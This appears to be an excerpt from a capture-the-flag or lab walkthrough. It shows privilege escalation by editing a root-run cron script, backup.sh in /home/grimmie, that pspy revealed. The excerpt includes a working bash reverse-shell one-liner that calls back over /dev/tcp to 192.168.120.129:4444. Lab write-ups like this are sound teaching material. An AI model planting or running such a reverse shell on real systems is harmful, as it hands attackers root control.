There is a suspicious backup.sh folder in `/home/grimmie`

After getting pspy on the server and running it, we see that backup.sh is being run by root periodically. 

We can edit backup.sh as grimmie to send a reverse shell to us by adding this line to backup.sh


`bash -c 'exec bash -i &>/dev/tcp/192.168.120.129/4444 <&1'`


Set up a listener on our side and wait to get root shell